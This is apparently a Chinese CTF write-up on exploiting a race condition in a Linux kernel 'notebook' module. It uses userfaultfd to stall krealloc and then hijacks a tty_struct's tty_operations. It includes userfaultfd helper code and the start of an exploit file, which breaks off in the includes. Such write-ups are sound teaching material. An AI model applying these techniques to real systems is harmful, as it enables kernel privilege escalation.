本文主要参考资料：<a target="_blank" rel="noopener" href="https://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd">资料</a></p>
<h1 id="step-1-查看file_operations结构体"><a class="markdownIt-Anchor" href="#step-1-查看file_operations结构体"></a> Step 1: 查看file_operations结构体</h1>
<p><img src="1.png" alt="" /><br />
找到file_operations结构体，其中定义了write函数和ioctl函数的地址。但这里实际上还隐含着定义了read函数。因为read函数在模块中的偏移为0，因此可以认为结构体中所有为0的字段都指向read函数。不过我们这里因为用不到其他函数，因此认为read函数也被定义了。</p>
<h1 id="step-2-分析write函数"><a class="markdownIt-Anchor" href="#step-2-分析write函数"></a> Step 2: 分析write函数</h1>
<p><img src="2.png" alt="" /><br />
write函数就是一个普通的写入，从用户内存读取，其中第三个参数index不能大于0x10，复制的size由notebook中的size决定。</p>
<h1 id="step-3-分析ioctl函数"><a class="markdownIt-Anchor" href="#step-3-分析ioctl函数"></a> Step 3: 分析ioctl函数</h1>
<p><img src="3.png" alt="" /><br />
ioctl函数一共有4种有效指令码，分别对应add、gift、del、edit四个函数。接下来分别进行分析。</p>
<h1 id="step-4-分析noteadd函数"><a class="markdownIt-Anchor" href="#step-4-分析noteadd函数"></a> Step 4: 分析noteadd函数</h1>
<p><img src="4.png" alt="" /><br />
添加函数中每一个note的大小不能超过0x60，传入的第三个参数将被拷贝到name中。</p>
<h1 id="step-5-分析notegift函数"><a class="markdownIt-Anchor" href="#step-5-分析notegift函数"></a> Step 5: 分析notegift函数</h1>
<p><img src="5.png" alt="" /><br />
这个函数是直接将notebook这个数组输出出来了，我们能够实时获取到notebook中所有指针和size的信息。看上去是一个比较有用的函数。</p>
<h1 id="step-6-分析notedel函数"><a class="markdownIt-Anchor" href="#step-6-分析notedel函数"></a> Step 6: 分析notedel函数</h1>
<p><img src="6.png" alt="" /><br />
删除函数中规中矩，就是一个删除功能，不留悬挂指针。</p>
<h1 id="step-7-分析noteedit函数"><a class="markdownIt-Anchor" href="#step-7-分析noteedit函数"></a> Step 7: 分析noteedit函数</h1>
<p><img src="7.png" alt="" /><br />
这个函数会修改内存块的大小，使用krealloc函数对齐重新分配空间，而且只有在确认重新分配的空间有效的情况下才会修改notebook数组中的元素。当传入的newsize为0时，会被当做free处理释放空间，同时移出指针和size。</p>
<h1 id="step-8-分析read函数"><a class="markdownIt-Anchor" href="#step-8-分析read函数"></a> Step 8: 分析read函数</h1>
<p><img src="8.png" alt="" /><br />
read函数也很普通，就是一个将notebook内存块中的内容读出的函数。</p>
<h1 id="step-9-查看runsh和init脚本"><a class="markdownIt-Anchor" href="#step-9-查看runsh和init脚本"></a> Step 9: 查看run.sh和init脚本</h1>
<p>本题的run.sh中，我们发现打开了kaslr、SMP保护。<br />
本题的init文件中，有一些值得关注的地方：<br />
<img src="9.png" alt="" /><br />
脚本中将/proc/modules中的notebook文件移动到了/tmp中，我们能够通过/tmp/moduleaddr这个文件获取到notebook这个模块在内核中的加载地址。这便于我们调试，同时也可能为后面的漏洞利用提供条件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /tmp/moduleaddr </span><br><span class="line">notebook 16384 0 - Live 0xffffffffc03ae000 (O)</span><br></pre></td></tr></table></figure>
<h1 id="step-10-漏洞分析"><a class="markdownIt-Anchor" href="#step-10-漏洞分析"></a> Step 10: 漏洞分析</h1>
<p>注意noteedit函数，其中并没有对新分配的内存大小进行限制，也就是说我们可以绕过noteadd中申请大小最大只能为0x60的限制。</p>
<p>然后再看一下各个函数的加锁情况。noteadd、noteedit函数加了读锁，notedel函数加了写锁。这里存在条件竞争漏洞：noteedit使用的是krealloc函数重新分配内存。当重新分配的大小大于原来的大小时会将原来的内存空间释放，并且noteedit函数中<strong>notebook相应指针的修改发生在krealloc之后</strong>。如果在当前线程的noteedit还没有修改notebook时将这块内存重新分配，并在另一个线程中写入，就会造成条件竞争漏洞。但在当前线程一直在执行的情况下，krealloc和修改指针的操作相隔时间极短，在这段时间内重新分配到这块空间并修改难度极大。因此<strong>本题使用一种称为userfaultfd</strong>的利用方式来解决这个问题。</p>
<blockquote>
<p>（摘自<a target="_blank" rel="noopener" href="https://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd">资料</a>）userfaultfd 本身只是一个常规的与处理缺页异常相关的系统调用，但是通过这个机制我们可以控制进程执行流程的先后顺序，从而使得对条件竞争的利用成功率大幅提高。</p>
</blockquote>
<p>在Linux 5.4版本及以下内核中，这种利用方式都是可行的，往上的版本中内核规定只有root才有权限执行此类操作。不过我们通过uname -a命令查看到本题的linux版本是4.15.8，可以使用这种方式进行利用。</p>
<p>这种利用方式在原理上较为复杂，但是有现成的调用函数可用，只要传入适当的参数就能够设定在缺页异常时执行某个函数。具体的原理在<a target="_blank" rel="noopener" href="https://blog.csdn.net/maybeYoc/article/details/123456398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165899942316782184627366%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=165899942316782184627366&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-123456398-null-null.142%5Ev35%5Econtrol&amp;utm_term=userfaultfd&amp;spm=1018.2226.3001.4187">这篇文章</a>中有详细的解释，感兴趣的读者可以了解一下，不过不看也没关系，我们使用固定的函数模板即可。（以下代码摘自<a target="_blank" rel="noopener" href="https://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd">资料</a>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[x] Error at: %s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为一块指定地址addr、大小len的内存空间注册缺页异常函数handler</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">registerUserFaultFd</span><span class="params">(<span class="type">void</span> * addr, <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">void</span> (*handler)(<span class="type">void</span>*))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span>	<span class="comment">// 这个arg参数对应上面registerUserFaultFd中pthread_create的第四个参数，将uffd文件描述符传入本函数中</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * [在这停顿.jpg]</span></span><br><span class="line"><span class="comment">         * 当 poll 返回时说明出现了缺页异常</span></span><br><span class="line"><span class="comment">         * 你可以在这里插入一些比如说 sleep() 一类的操作</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么我们应该如何触发缺页异常呢？很简单，我们只需要在noteedit函数中传入mmap出来空间的地址即可。那么有的读者就要问了，mmap出来的空间不是已经被映射了吗，krealloc之后的copy_from_user函数拷贝的大小是0x100远小于0x1000，为什么还会缺页呢？我们直接访问试试。写一条语句直接向这块空间写入一个字节，最后居然是segmentation fault，段错误。这是怎么回事？我们不是通过mmap已经分配了这个空间了吗？<br />
<img src="10.png" alt="" /><br />
<img src="11.png" alt="" /><br />
通过内核调试，我们发现，内核确实无法访问这块mmap出来的空间，即使是vmmap也没有显示这块空间。</p>
<p>找了很长时间的资料，最终在<a target="_blank" rel="noopener" href="https://blog.csdn.net/21cnbao/article/details/108480659?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165908725716782388037719%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165908725716782388037719&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108480659-null-null.142%5Ev35%5Econtrol&amp;utm_term=%E4%BD%BF%E7%94%A8mmap%E5%8F%91%E7%94%9F%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8&amp;spm=1018.2226.3001.4187">这篇文章</a>中发现了一丝端倪：</p>
<blockquote>
<p>当我们应用程序使用ｍｍap来创建匿名的内存映射的时候，页同样只是分配了虚拟内存，并没有分配物理内存，第一次去访问的时候才会通过触发缺页异常来分配物理页建立和虚拟页的映射关系。</p>
</blockquote>
<p>即这块内存并没有物理内存与之对应，因此会触发缺页异常。</p>
<p>我们事先对这块mmap出来的空间注册userfaultfd函数，那么缺页异常发生时就会执行这个函数了，在函数中我们可以以各种方式阻塞该线程的执行，最为简单的就是调用sleep函数睡一段时间，然后另外一个线程趁此机会进行其他的恶意操作（指重复打开/dev/ptmx文件使原note空间有可能被分配为tty_struct结构体，然后write函数调用进行修改）。</p>
<p>下面是打开/dev/ptmx时执行的一个关键函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __init <span class="title function_">unix98_pty_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	ptm_driver = tty_alloc_driver(NR_UNIX98_PTY_MAX,</span><br><span class="line">			TTY_DRIVER_RESET_TERMIOS |</span><br><span class="line">			TTY_DRIVER_REAL_RAW |</span><br><span class="line">			TTY_DRIVER_DYNAMIC_DEV |</span><br><span class="line">			TTY_DRIVER_DEVPTS_MEM |</span><br><span class="line">			TTY_DRIVER_DYNAMIC_ALLOC);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(ptm_driver))</span><br><span class="line">		panic(<span class="string">&quot;Couldn&#x27;t allocate Unix98 ptm driver&quot;</span>);</span><br><span class="line">	pts_driver = tty_alloc_driver(NR_UNIX98_PTY_MAX,</span><br><span class="line">			TTY_DRIVER_RESET_TERMIOS |</span><br><span class="line">			TTY_DRIVER_REAL_RAW |</span><br><span class="line">			TTY_DRIVER_DYNAMIC_DEV |</span><br><span class="line">			TTY_DRIVER_DEVPTS_MEM |</span><br><span class="line">			TTY_DRIVER_DYNAMIC_ALLOC);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(pts_driver))</span><br><span class="line">		panic(<span class="string">&quot;Couldn&#x27;t allocate Unix98 pts driver&quot;</span>);</span><br><span class="line"></span><br><span class="line">	ptm_driver-&gt;driver_name = <span class="string">&quot;pty_master&quot;</span>;</span><br><span class="line">	ptm_driver-&gt;name = <span class="string">&quot;ptm&quot;</span>;</span><br><span class="line">	ptm_driver-&gt;major = UNIX98_PTY_MASTER_MAJOR;</span><br><span class="line">	ptm_driver-&gt;minor_start = <span class="number">0</span>;</span><br><span class="line">	ptm_driver-&gt;type = TTY_DRIVER_TYPE_PTY;</span><br><span class="line">	ptm_driver-&gt;subtype = PTY_TYPE_MASTER;</span><br><span class="line">	ptm_driver-&gt;init_termios = tty_std_termios;</span><br><span class="line">	ptm_driver-&gt;init_termios.c_iflag = <span class="number">0</span>;</span><br><span class="line">	ptm_driver-&gt;init_termios.c_oflag = <span class="number">0</span>;</span><br><span class="line">	ptm_driver-&gt;init_termios.c_cflag = B38400 | CS8 | CREAD;</span><br><span class="line">	ptm_driver-&gt;init_termios.c_lflag = <span class="number">0</span>;</span><br><span class="line">	ptm_driver-&gt;init_termios.c_ispeed = <span class="number">38400</span>;</span><br><span class="line">	ptm_driver-&gt;init_termios.c_ospeed = <span class="number">38400</span>;</span><br><span class="line">	ptm_driver-&gt;other = pts_driver;</span><br><span class="line">	tty_set_operations(ptm_driver, &amp;ptm_unix98_ops);</span><br><span class="line"></span><br><span class="line">	pts_driver-&gt;driver_name = <span class="string">&quot;pty_slave&quot;</span>;</span><br><span class="line">	pts_driver-&gt;name = <span class="string">&quot;pts&quot;</span>;</span><br><span class="line">	pts_driver-&gt;major = UNIX98_PTY_SLAVE_MAJOR;</span><br><span class="line">	pts_driver-&gt;minor_start = <span class="number">0</span>;</span><br><span class="line">	pts_driver-&gt;type = TTY_DRIVER_TYPE_PTY;</span><br><span class="line">	pts_driver-&gt;subtype = PTY_TYPE_SLAVE;</span><br><span class="line">	pts_driver-&gt;init_termios = tty_std_termios;</span><br><span class="line">	pts_driver-&gt;init_termios.c_cflag = B38400 | CS8 | CREAD;</span><br><span class="line">	pts_driver-&gt;init_termios.c_ispeed = <span class="number">38400</span>;</span><br><span class="line">	pts_driver-&gt;init_termios.c_ospeed = <span class="number">38400</span>;</span><br><span class="line">	pts_driver-&gt;other = ptm_driver;</span><br><span class="line">	tty_set_operations(pts_driver, &amp;pty_unix98_ops);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tty_register_driver(ptm_driver))</span><br><span class="line">		panic(<span class="string">&quot;Couldn&#x27;t register Unix98 ptm driver&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (tty_register_driver(pts_driver))</span><br><span class="line">		panic(<span class="string">&quot;Couldn&#x27;t register Unix98 pts driver&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now create the /dev/ptmx special device */</span></span><br><span class="line">	tty_default_fops(&amp;ptmx_fops);</span><br><span class="line">	ptmx_fops.open = ptmx_open;</span><br><span class="line"></span><br><span class="line">	cdev_init(&amp;ptmx_cdev, &amp;ptmx_fops);</span><br><span class="line">	<span class="keyword">if</span> (cdev_add(&amp;ptmx_cdev, MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="number">1</span>) ||</span><br><span class="line">	    register_chrdev_region(MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="number">1</span>, <span class="string">&quot;/dev/ptmx&quot;</span>) &lt; <span class="number">0</span>)</span><br><span class="line">		panic(<span class="string">&quot;Couldn&#x27;t register /dev/ptmx driver&quot;</span>);</span><br><span class="line">	device_create(tty_class, <span class="literal">NULL</span>, MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="literal">NULL</span>, <span class="string">&quot;ptmx&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到其中一共通过tty_alloc_driver函数分配了两个tty_operations结构体，这两个结构体的tty_operations被分别赋值为ptm_unix98_ops和pty_unix98_ops。这两个是静态常量，因此可以在vmlinux的符号表中找到，其地址与基址的差值固定：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">ptm_unix98_ops</span> =</span> &#123;</span><br><span class="line">	.lookup = ptm_unix98_lookup,</span><br><span class="line">	.install = pty_unix98_install,</span><br><span class="line">	.remove = pty_unix98_remove,</span><br><span class="line">	.open = pty_open,</span><br><span class="line">	.close = pty_close,</span><br><span class="line">	.write = pty_write,</span><br><span class="line">	.write_room = pty_write_room,</span><br><span class="line">	.flush_buffer = pty_flush_buffer,</span><br><span class="line">	.chars_in_buffer = pty_chars_in_buffer,</span><br><span class="line">	.unthrottle = pty_unthrottle,</span><br><span class="line">	.ioctl = pty_unix98_ioctl,</span><br><span class="line">	.compat_ioctl = pty_unix98_compat_ioctl,</span><br><span class="line">	.resize = pty_resize,</span><br><span class="line">	.cleanup = pty_cleanup,</span><br><span class="line">	.show_fdinfo = pty_show_fdinfo,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">pty_unix98_ops</span> =</span> &#123;</span><br><span class="line">	.lookup = pts_unix98_lookup,</span><br><span class="line">	.install = pty_unix98_install,</span><br><span class="line">	.remove = pty_unix98_remove,</span><br><span class="line">	.open = pty_open,</span><br><span class="line">	.close = pty_close,</span><br><span class="line">	.write = pty_write,</span><br><span class="line">	.write_room = pty_write_room,</span><br><span class="line">	.flush_buffer = pty_flush_buffer,</span><br><span class="line">	.chars_in_buffer = pty_chars_in_buffer,</span><br><span class="line">	.unthrottle = pty_unthrottle,</span><br><span class="line">	.set_termios = pty_set_termios,</span><br><span class="line">	.start = pty_start,</span><br><span class="line">	.stop = pty_stop,</span><br><span class="line">	.cleanup = pty_cleanup,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在一个线程被阻塞时，我们可以通过read函数读取到tty_operations的地址值，通过最后12比特来确认这里的值是pty_unix98_ops还是ptm_unix98_ops。</p>
<p><strong>注意：tty_alloc_driver函数实际上调用的是__tty_alloc_driver这个函数，其中将tty_struct的magic字段赋值为TTY_DRIVER_MAGIC，值为0x5402（4.15.8版本内核，不同版本的值可能不同）。因此可以通过读取magic值判断这块内存是否被分配为tty_struct结构体。</strong></p>
<p>我们将tty_operations改为我们构造好的结构，但本题开启了SMP保护，不能直接写一个用户空间的内存地址。考虑到notegift函数能够为我们返回所有note的地址，因此可以考虑将tty_operations写在note里面。</p>
<h1 id="step-11-exp编写写好交互"><a class="markdownIt-Anchor" href="#step-11-exp编写写好交互"></a> Step 11 exp编写——写好交互</h1>
<p>实现接口与提示性输出。<br />
uffdexploit.c:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-28.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span 